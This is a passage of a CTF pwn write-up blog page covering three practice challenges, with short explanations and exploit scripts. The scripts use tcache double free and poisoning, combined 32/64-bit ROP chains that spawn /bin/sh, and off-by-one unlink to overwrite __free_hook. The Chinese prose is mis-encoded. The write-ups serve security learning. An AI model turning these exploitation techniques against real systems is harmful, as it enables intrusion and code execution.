<h2 id="ciscn-2019-final-2"><a href="#ciscn-2019-final-2" class="headerlink" title="ciscn_2019_final_2"></a>ciscn_2019_final_2</h2><p>æœ¬é¢˜éœ€è¦å°†è¯»å…¥çš„<code>flag</code>çš„<code>fd</code>æ”¹ä¸º666ã€‚</p>
<p>å­˜åœ¨tcache double freeæ¼æ´ï¼Œé¦–å…ˆåˆ†é…å¤šä¸ª<code>short</code>ï¼Œåˆ©ç”¨double freeæ³„éœ²å †åœ°å€ã€‚ç„¶åtcacheæŠ•æ¯’ï¼Œä¼ªé€ <code>chunk0</code>å¤§å°ï¼Œå¹¶é‡Šæ”¾è¿›å…¥unsorted binæ³„éœ²libcã€‚æ³¨æ„é‡Šæ”¾å‰å…ˆå¡«æ»¡tcacheæ‰èƒ½è¿›å…¥unsorted binã€‚</p>
<p>æ¥ä¸‹æ¥ç»§ç»­æŠ•æ¯’ä½¿<code>int</code>çš„<code>fd</code>æŒ‡å‘<code>fileno</code>ï¼Œå†æ¬¡double freeæ³„éœ²<code>chunk0</code>çš„<code>mem</code>æŒ‡é’ˆåœ°å€ã€‚æœ€åæŠ•æ¯’æŒ‡å‘<code>chunk0</code>çš„<code>mem</code>æŒ‡é’ˆåœ°å€ï¼Œå†ç”³è¯·ä¸‰æ¬¡å°±å¯ä»¥ä¿®æ”¹<code>fileno</code>äº†ã€‚</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">1</span>,<span class="number">0x30</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x20</span>) <span class="comment"># total size: 0x90</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x20</span>) <span class="comment"># prevent merging</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x30</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">ru(<span class="string">&#x27;number :&#x27;</span>)</span><br><span class="line">chunk0 = <span class="built_in">int</span>(ru(<span class="string">&#x27;\n&#x27;</span>))<span class="number">-0xa0</span></span><br><span class="line">leak(<span class="string">&#x27;chunk0&#x27;</span>,chunk0)</span><br><span class="line">add(<span class="number">2</span>,chunk0) <span class="comment"># poisoning</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0xdeadbeef</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x91</span>) <span class="comment"># chunk0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>): <span class="comment"># fill tcache</span></span><br><span class="line">	free(<span class="number">1</span>)</span><br><span class="line">	add(<span class="number">2</span>,<span class="number">0x20</span>)</span><br><span class="line">free(<span class="number">1</span>) <span class="comment"># unsorted</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">&#x27;number :&#x27;</span>)</span><br><span class="line"></span><br><span class="line">base = <span class="built_in">int</span>(ru(<span class="string">&#x27;\n&#x27;</span>))<span class="number">-96</span>-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]<span class="number">-0x10</span></span><br><span class="line">leak(<span class="string">&#x27;base&#x27;</span>,base)</span><br><span class="line">fileno = base+libc.sym[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>]+<span class="number">0x70</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,fileno) <span class="comment"># poisoning</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x30</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x20</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">&#x27;number :&#x27;</span>)</span><br><span class="line">chunk0_mem = <span class="built_in">int</span>(ru(<span class="string">&#x27;\n&#x27;</span>))<span class="number">-0x30</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,chunk0_mem) <span class="comment"># poisoning</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0xdeadbeef</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0xdeadbeef</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">666</span>)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;&gt;&#x27;</span>,<span class="number">4</span>)</span><br></pre></td></tr></table></figure>


<h2 id="å¼ºç½‘æ¯-æ‹Ÿæ€-stkof"><a href="#å¼ºç½‘æ¯-æ‹Ÿæ€-stkof" class="headerlink" title="å¼ºç½‘æ¯_æ‹Ÿæ€_stkof"></a>å¼ºç½‘æ¯_æ‹Ÿæ€_stkof</h2><p>é‡‡ç”¨äº†æ‹Ÿæ€é˜²å¾¡ï¼Œç®€å•æ¥è¯´å°±æ˜¯è¦ç”¨åŒä¸€ä¸ªè„šæœ¬åŒæ—¶åœ¨32ä½å’Œ64ä½ç¨‹åºä¸Šgetshellä¸”ä¸¤ä¸ªç¨‹åºçš„è¾“å‡ºå¿…é¡»ç›¸åŒã€‚</p>
<p>é¦–å…ˆæ£€æŸ¥ä¸¤ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæ¼æ´éƒ½æ˜¯ç®€å•çš„æ ˆæº¢å‡ºå¹¶ä¸”ç©ºé—´å¾ˆå¤§ã€‚åŒºåˆ«åœ¨äºå¯ä»¥æº¢å‡ºçš„é•¿åº¦ç›¸å·®8å­—èŠ‚ï¼Œè¿™8å­—èŠ‚åº”è¯¥å°±æ˜¯èƒ½å¤Ÿç”¨åŒä¸€ä¸ªè„šæœ¬çš„å…³é”®æ‰€åœ¨ã€‚</p>
<p>å®¹æ˜“æƒ³åˆ°åˆ©ç”¨å¸¸è§„ret2syscallï¼Œåˆ†åˆ«å†™å‡º32ä½å’Œ64ä½è„šæœ¬ï¼š</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pop_eax = <span class="number">0x80a8af6</span></span><br><span class="line">pop_dcb = <span class="number">0x806e9f1</span></span><br><span class="line">int_80 = <span class="number">0x80495a3</span></span><br><span class="line">data = <span class="number">0x80d7000</span></span><br><span class="line"></span><br><span class="line">chain86 = [</span><br><span class="line">	<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x10c</span>+<span class="number">4</span>),</span><br><span class="line">	elf.sym[<span class="string">&#x27;read&#x27;</span>],</span><br><span class="line">	pop_dcb,<span class="number">0</span>,data,<span class="number">0x100</span>,</span><br><span class="line">	pop_dcb,<span class="number">0</span>,<span class="number">0</span>,data,</span><br><span class="line">	pop_eax,<span class="number">0xb</span>,</span><br><span class="line">	int_80</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">payload = flat(chain86)</span><br><span class="line">sa(<span class="string">&#x27;?&#x27;</span>,payload)</span><br><span class="line">s(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pop_rax = <span class="number">0x43b97c</span></span><br><span class="line">pop_rdi = <span class="number">0x4005f6</span></span><br><span class="line">pop_rsi = <span class="number">0x405895</span></span><br><span class="line">pop_rdx = <span class="number">0x43b9d5</span></span><br><span class="line">syscall = <span class="number">0x461645</span></span><br><span class="line">data = <span class="number">0x6a4e40</span></span><br><span class="line"></span><br><span class="line">chain64 = [</span><br><span class="line">	<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x110</span>+<span class="number">8</span>),</span><br><span class="line">	pop_rax,<span class="number">0</span>,pop_rdi,<span class="number">0</span>,</span><br><span class="line">	pop_rsi,data,pop_rdx,<span class="number">0x100</span>,</span><br><span class="line">	syscall,</span><br><span class="line">	pop_rax,<span class="number">59</span>,pop_rdi,data,</span><br><span class="line">	pop_rsi,<span class="number">0</span>,pop_rdx,<span class="number">0</span>,</span><br><span class="line">	syscall</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">payload = flat(chain64)</span><br><span class="line">sa(<span class="string">&#x27;?&#x27;</span>,payload)</span><br><span class="line">s(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>é‚£ä¹ˆæ€ä¹ˆæŠŠä¸¤è€…åˆå¹¶å‘¢ï¼Ÿè¿™å°±éœ€è¦ç”¨åˆ°8å­—èŠ‚çš„æ ˆæº¢å‡ºé•¿åº¦å·®ï¼Œåœ¨è¿™8å­—èŠ‚ä¸­ï¼Œæˆ‘ä»¬åˆ†åˆ«è°ƒæ•´32ä½ç¨‹åºå’Œ64ä½ç¨‹åºçš„<code>esp</code>å’Œ<code>rsp</code>æŒ‡é’ˆï¼Œä½¿å¾—ç»è¿‡è°ƒæ•´åæ ˆä¸Šçš„è¿”å›åœ°å€æŒ‡å‘payloadçš„ä¸åŒéƒ¨åˆ†ã€‚</p>
<p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ ˆå˜é‡åœ¨32ä½ä¸‹ä½äº<code>esp+0xc</code>ï¼Œåœ¨64ä½ä¸‹ä½äº<code>rsp+0x0</code>ï¼Œåœ¨è®¡ç®—éœ€è¦å¡«å……çš„paddingæ—¶éœ€è¦è€ƒè™‘åˆ°è¿™ä¸€ç‚¹ã€‚</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">pop_eax = <span class="number">0x80a8af6</span></span><br><span class="line">pop_dcb = <span class="number">0x806e9f1</span></span><br><span class="line">int_80 = <span class="number">0x80495a3</span></span><br><span class="line">data86 = <span class="number">0x80d7000</span></span><br><span class="line">read = <span class="number">0x806c8e0</span></span><br><span class="line">add_esp_20 = <span class="number">0x80a69f2</span></span><br><span class="line"></span><br><span class="line">offset86 = <span class="number">0x20</span><span class="number">-0xc</span> <span class="comment"># esp+0xc</span></span><br><span class="line">chain86 = [</span><br><span class="line">	<span class="string">&#x27;a&#x27;</span>*offset86,</span><br><span class="line">	read,</span><br><span class="line">	pop_dcb,<span class="number">0</span>,data86,<span class="number">0x8</span>,</span><br><span class="line">	pop_dcb,<span class="number">0</span>,<span class="number">0</span>,data86,</span><br><span class="line">	pop_eax,<span class="number">0xb</span>,</span><br><span class="line">	int_80</span><br><span class="line">]</span><br><span class="line">payload86 = flat(chain86,word_size=<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">pop_rax = <span class="number">0x43b97c</span></span><br><span class="line">pop_rdi = <span class="number">0x4005f6</span></span><br><span class="line">pop_rsi = <span class="number">0x405895</span></span><br><span class="line">pop_rdx = <span class="number">0x43b9d5</span></span><br><span class="line">syscall = <span class="number">0x461645</span></span><br><span class="line">data64 = <span class="number">0x6a4e40</span></span><br><span class="line">add_rsp_80 = <span class="number">0x40cd17</span></span><br><span class="line"></span><br><span class="line">offset64 = <span class="number">0x80</span>-<span class="built_in">len</span>(payload86) <span class="comment"># rsp+0x0</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(offset64)</span><br><span class="line">chain64 = [</span><br><span class="line">	<span class="string">&#x27;a&#x27;</span>*offset64,</span><br><span class="line">	pop_rax,<span class="number">0</span>,pop_rdi,<span class="number">0</span>,</span><br><span class="line">	pop_rsi,data64,pop_rdx,<span class="number">0x100</span>,</span><br><span class="line">	syscall,</span><br><span class="line">	pop_rax,<span class="number">59</span>,pop_rdi,data64,</span><br><span class="line">	pop_rsi,<span class="number">0</span>,pop_rdx,<span class="number">0</span>,</span><br><span class="line">	syscall</span><br><span class="line">]</span><br><span class="line">payload64 = flat(chain64,word_size=<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x110</span> + (p32(add_esp_20)+<span class="string">&#x27;aaaa&#x27;</span>) + p64(add_rsp_80) + payload86 + payload64</span><br><span class="line"></span><br><span class="line">sa(<span class="string">&#x27;?&#x27;</span>,payload)</span><br><span class="line">s(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br></pre></td></tr></table></figure>


<h2 id="axb-2019-heap"><a href="#axb-2019-heap" class="headerlink" title="axb_2019_heap"></a>axb_2019_heap</h2><p>åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ³„éœ²å †åœ°å€å’Œlibcã€‚éšåï¼Œå¯ä»¥å‘ç°<code>edit</code>æ—¶å­˜åœ¨off by oneï¼Œæˆ‘ä»¬åœ¨æ„é€ unlinkçš„fake chunkæ—¶ï¼Œè¯¥æ¼æ´ä¼šå¯¼è‡´ä¿®æ”¹ä¸‹ä¸€ä¸ªchunkçš„<code>prev_size</code>åä¼šè¦†ç›–æ‰å®ƒçš„<code>size</code>å­—æ®µæœ€åä¸€ä¸ªå­—èŠ‚ã€‚ä½†æ˜¯åŒæ ·çš„ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥åˆ©ç”¨è¯¥æ¼æ´æ‰‹åŠ¨æ¢å¤æœ€åä¸€ä¸ªå­—èŠ‚ã€‚ï¼Œè¿™é‡Œæ˜¯<code>0xa0</code>ã€‚</p>
<p>æ¥ä¸‹æ¥å°±å¸¸è§„unlinkï¼Œè¦†ç›–<code>free_hook</code>ä¸º<code>system</code>ï¼Œæ³¨æ„ç»´æŒåŸ<code>note</code>æ•°ç»„ç»“æ„ã€‚</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">sla(<span class="string">&#x27;name: &#x27;</span>,<span class="string">&#x27;%11$p.%15$p&#x27;</span>)</span><br><span class="line">ru(<span class="string">&#x27;, &#x27;</span>)</span><br><span class="line">heap = <span class="built_in">int</span>(ru(<span class="string">&#x27;.&#x27;</span>),<span class="number">16</span>)<span class="number">-0x1186</span></span><br><span class="line">base = <span class="built_in">int</span>(ru(<span class="string">&#x27;\n&#x27;</span>),<span class="number">16</span>)<span class="number">-0x20830</span></span><br><span class="line">leak(<span class="string">&#x27;heap&#x27;</span>,heap)</span><br><span class="line">leak(<span class="string">&#x27;base&#x27;</span>,base)</span><br><span class="line"></span><br><span class="line">note = heap+<span class="number">0x202060</span></span><br><span class="line">system = base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook = base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x98</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x98</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x90</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fd = note<span class="number">-0x18</span></span><br><span class="line">bk = note<span class="number">-0x10</span></span><br><span class="line">fake = flat(<span class="number">0</span>,<span class="number">0x91</span>,fd,bk).ljust(<span class="number">0x90</span>,<span class="string">&#x27;\x00&#x27;</span>) + p64(<span class="number">0x90</span>)+<span class="string">&#x27;\xa0&#x27;</span></span><br><span class="line">edit(<span class="number">0</span>,fake)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,flat(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,free_hook,<span class="number">0x98</span>))</span><br><span class="line">edit(<span class="number">0</span>,p64(system))</span><br><span class="line">free(<span class="number">3</span>)</span><br></pre></td></tr></table></figure>
</div><div class="article-licensing box"><div class="licensing-title"><p>BUUCTF Pwn ç»ƒä¹ </p><p><a href="https://signormercurio.me/post/BUUPwn/">https://signormercurio.me/post/BUUPwn/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>Author</h6><p>Mercury</p></div></div><div class="level-item is-narrow"><div><h6>Posted on</h6><p>2019-12-14</p></div></div><div class="level-item is-narrow"><div><h6>Licensed under</h6><p><a class="icon" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a><a class="" rel="noopener" target="_blank" title="CC BY-NC-SA 4.0" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a></p></div></div></div></div></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/%E6%A0%88%E8%BF%81%E7%A7%BB/">æ ˆè¿ç§»</a><a class="link-muted mr-2" rel="tag" href="/tags/%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/">æ•´æ•°æº¢å‡º</a><a class="link-muted mr-2" rel="tag" href="/tags/ROP/">ROP</a><a class="link-muted mr-2" rel="tag" href="/tags/fastbin-attack/">fastbin-attack</a><a class="link-muted mr-2" rel="tag" href="/tags/mprotect/">mprotect</a><a class="link-muted mr-2" rel="tag" href="/tags/SROP/">SROP</a><a class="link-muted mr-2" rel="tag" href="/tags/tcache/">tcache</a><a class="link-muted mr-2" rel="tag" href="/tags/off-by-one/">off-by-one</a><a class="link-muted mr-2" rel="tag" href="/tags/unlink/">unlink</a><a class="link-muted mr-2" rel="tag" href="/tags/fastbin-consolidation/">fastbin-consolidation</a><a class="link-muted mr-2" rel="tag" href="/tags/mmap-thresold/">mmap_thresold</a><a class="link-muted mr-2" rel="tag" href="/tags/House-of-Force/">House-of-Force</a><a class="link-muted mr-2" rel="tag" href="/tags/House-of-Spirit/">House-of-Spirit</a><a class="link-muted mr-2" rel="tag" href="/tags/largebin-attack/">largebin-attack</a><a class="link-muted mr-2" rel="tag" href="/tags/House-of-Orange/">House-of-Orange</a></div><!--!--></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/post/ElGamalECC/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">ElGamal å¯†ç æ–¹æ¡ˆçš„æ¤­åœ†æ›²çº¿å½¢å¼å®ç°</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/post/QTableSSpagination/"><span class="level-item">QTable æœåŠ¡ç«¯åˆ†é¡µå®è·µ</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 class="title is-5">Comments</h3><div class="content" id="valine-thread"></div><script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js"></script><script>new Valine({
            el: '#valine-thread' ,
            appId: "RkxCznUcvfzFBgfMiMr0BAfd-gzGzoHsz",
            appKey: "sw2sEPOl4haCAXKUFYiBFMrR",
            placeholder: "Leave comments here...",
            avatar: "mm",
            
            meta: ["nick","mail","link"],
            pageSize: 10,
            lang: "en",
            visitor: true,
            highlight: true,
            
            
            
            
            
            requiredFields: ["nick","mail"],
        });</script></div></div></div><!--!--><div class="column column-right is-4-tablet is-4-desktop is-4-widescreen  order-3 is-sticky"><div class="card widget" id="toc" data-type="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">Catalogue</h3><ul class="menu-list"><li><a class="level is-mobile" href="#test-your-nc"><span class="level-left"><span class="level-item">1</span><span class="level-item">test_your_nc</span></span></a></li><li><a class="level is-mobile" href="#rip"><span class="level-left"><span class="level-item">2</span><span class="level-item">rip</span></span></a></li><li><a class="level is-mobile" href="#warmup-csaw-2016"><span class="level-left"><span class="level-item">3</span><span class="level-item">warmup_csaw_2016</span></span></a></li><li><a class="level is-mobile" href="#pwn1-sctf-2016"><span class="level-left"><span class="level-item">4</span><span class="level-item">pwn1_sctf_2016</span></span></a></li><li><a class="level is-mobile" href="#ciscn-2019-c-1"><span class="level-left"><span class="level-item">5</span><span class="level-item">ciscn_2019_c_1</span></span></a></li><li><a class="level is-mobile" href="#ciscn-2019-n-1"><span class="level-left"><span class="level-item">6</span><span class="level-item">ciscn_2019_n_1</span></span></a></li><li><a class="level is-mobile" href="#ciscn-2019-en-2"><span class="level-left"><span class="level-item">7</span><span class="level-item">ciscn_2019_en_2</span></span></a></li><li><a class="level is-mobile" href="#OGeek2019-babyrop"><span class="level-left"><span class="level-item">8</span><span class="level-item">[OGeek2019]babyrop</span></span></a></li><li><a class="level is-mobile" href="#babyheap-0ctf-2017"><span class="level-left"><span class="level-item">9</span><span class="level-item">babyheap_0ctf_2017</span></span></a></li><li><a class="level is-mobile" href="#get-started-3dsctf-2016"><span class="level-left"><span class="level-item">10</span><span class="level-item">get_started_3dsctf_2016</span></span></a></li><li><a class="level is-mobile" href="#not-the-same-3dsctf-2016"><span class="level-left"><span class="level-item">11</span><span class="level-item">not_the_same_3dsctf_2016</span></span></a></li><li><a class="level is-mobile" href="#ç¬¬äº”ç©ºé—´-2019-å†³èµ›-PWN5"><span class="level-left"><span class="level-item">12</span><span class="level-item">[ç¬¬äº”ç©ºé—´ 2019 å†³èµ›]PWN5</span></span></a></li><li><a class="level is-mobile" href="#ciscn-2019-n-8"><span class="level-left"><span class="level-item">13</span><span class="level-item">ciscn_2019_n_8</span></span></a></li><li><a class="level is-mobile" href="#babyfengshui-33c3-2016"><span class="level-left"><span class="level-item">14</span><span class="level-item">babyfengshui_33c3_2016</span></span></a></li><li><a class="level is-mobile" href="#ciscn-2019-s-3"><span class="level-left"><span class="level-item">15</span><span class="level-item">ciscn_2019_s_3</span></span></a></li><li><a class="level is-mobile" href="#HarekazeCTF2019-baby-rop"><span class="level-left"><span class="level-item">16</span><span class="level-item">[HarekazeCTF2019]baby_rop</span></span></a></li><li><a class="level is-mobile" href="#pwn2-sctf-2016"><span class="level-left"><span class="level-item">17</span><span class="level-item">pwn2_sctf_2016</span></span></a></li><li><a class="level is-mobile" href="#ez-pz-hackover-2016"><span class="level-left"><span class="level-item">18</span><span class="level-item">ez_pz_hackover_2016</span></span></a></li><li><a class="level is-mobile" href="#ciscn-2019-ne-5"><span class="level-left"><span class="level-item">19</span><span class="level-item">ciscn_2019_ne_5</span></span></a></li><li><a class="level is-mobile" href="#HarekazeCTF2019-baby-rop2"><span class="level-left"><span class="level-item">20</span><span class="level-item">[HarekazeCTF2019]baby_rop2</span></span></a></li><li><a class="level is-mobile" href="#ciscn-2019-n-5"><span class="level-left"><span class="level-item">21</span><span class="level-item">ciscn_2019_n_5</span></span></a></li><li><a class="level is-mobile" href="#ciscn-2019-final-3"><span class="level-left"><span class="level-item">22</span><span class="level-item">ciscn_2019_final_3</span></span></a></li><li><a class="level is-mobile" href="#ciscn-2019-es-2"><span class="level-left"><span class="level-item">23</span><span class="level-item">ciscn_2019_es_2</span></span></a></li><li><a class="level is-mobile" href="#roarctf-2019-easy-pwn"><span class="level-left"><span class="level-item">24</span><span class="level-item">roarctf_2019_easy_pwn</span></span></a></li><li><a class="level is-mobile" href="#ciscn-2019-n-3"><span class="level-left"><span class="level-item">25</span><span class="level-item">ciscn_2019_n_3</span></span></a></li><li><a class="level is-mobile" href="#hitcon2014-stkof"><span class="level-left"><span class="level-item">26</span><span class="level-item">hitcon2014_stkof</span></span></a></li><li><a class="level is-mobile" href="#sleepyHolder-hitcon-2016"><span class="level-left"><span class="level-item">27</span><span class="level-item">sleepyHolder_hitcon_2016</span></span></a></li><li><a class="level is-mobile" href="#secretHolder-hitcon-2016"><span class="level-left"><span class="level-item">28</span><span class="level-item">secretHolder_hitcon_2016</span></span></a></li><li><a class="level is-mobile" href="#bcloud-bctf-2016"><span class="level-left"><span class="level-item">29</span><span class="level-item">bcloud_bctf_2016</span></span></a></li><li><a class="level is-mobile" href="#lctf2016-pwn200"><span class="level-left"><span class="level-item">30</span><span class="level-item">lctf2016_pwn200</span></span></a></li><li><a class="level is-mobile" href="#zctf2016-note2"><span class="level-left"><span class="level-item">31</span><span class="level-item">zctf2016_note2</span></span></a></li><li><a class="level is-mobile" href="#zctf2016-note3"><span class="level-left"><span class="level-item">32</span><span class="level-item">zctf2016_note3</span></span></a></li><li><a class="level is-mobile" href="#0ctf-2018-heapstorm2"><span class="level-left"><span class="level-item">33</span><span class="level-item">0ctf_2018_heapstorm2</span></span></a></li><li><a class="level is-mobile" href="#houseoforange-hitcon-2016"><span class="level-left"><span class="level-item">34</span><span class="level-item">houseoforange_hitcon_2016</span></span></a></li><li><a class="level is-mobile" href="#ciscn-2019-final-2"><span class="level-left"><span class="level-item">35</span><span class="level-item">ciscn_2019_final_2</span></span></a></li><li><a class="level is-mobile" href="#å¼ºç½‘æ¯-æ‹Ÿæ€-stkof"><span class="level-left"><span class="level-item">36</span><span class="level-item">å¼ºç½‘æ¯_æ‹Ÿæ€_stkof</span></span></a></li><li><a class="level is-mobile" href="#axb-2019-heap"><span class="level-left"><span class="level-item">37</span><span class="level-item">axb_2019_heap</span></span></a></li></ul></div></div><style>#toc .menu-list > li > a.is-active + .menu-list { display: block; }#toc .menu-list > li > a + .menu-list { display: none; }</style><script src="/js/toc.js" defer></script></div><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">Recents</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-09-10T08:27:59.000Z">2021-09-10</time></p><p class="title"><a href="/post/Container/">å®¹å™¨æŠ€æœ¯åŸç†</a></p><p class="categories"><a href="/categories/%E6%8E%A2%E7%B4%A2/">æ¢ç´¢</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-09-08T07:50:13.000Z">2021-09-08</time></p><p class="title"><a href="/post/GoError/">Go Error å¤„ç†</a></p><p class="categories"><a href="/categories/%E6%8E%A2%E7%B4%A2/">æ¢ç´¢</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-08-26T14:57:42.000Z">2021-08-26</time></p><p class="title"><a href="/post/M1Win11/">åœ¨ MacBook Pro M1 ä¸Šè¿è¡Œ Windows 11</a></p><p class="categories"><a href="/categories/%E6%8E%A2%E7%B4%A2/">æ¢ç´¢</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-08-21T03:48:08.000Z">2021-08-21</time></p><p class="title"><a href="/post/TencentShit/">è…¾è®¯ç”Ÿæ€çš„æ³¥æ²¼</a></p><p class="categories"><a href="/categories/%E6%8E%A2%E7%B4%A2/">æ¢ç´¢</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-07-29T15:26:26.000Z">2021-07-29</time></p><p class="title"><a 